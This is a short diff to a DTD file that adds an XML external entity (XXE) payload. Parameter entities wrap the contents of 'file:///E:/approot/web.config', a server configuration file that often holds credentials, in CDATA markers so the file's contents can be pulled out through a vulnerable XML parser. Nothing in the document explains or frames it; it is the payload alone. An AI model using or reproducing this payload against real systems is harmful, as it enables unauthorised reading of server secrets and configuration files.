@@ -1,2 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!ENTITY all "%start;%goodies;%end;">
+<!ELEMENT data (#PCDATA)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "file:///E:/approot/web.config">
+<!ENTITY % end "]]>">
+<!ENTITY all '%start;%goodies;%end;'>
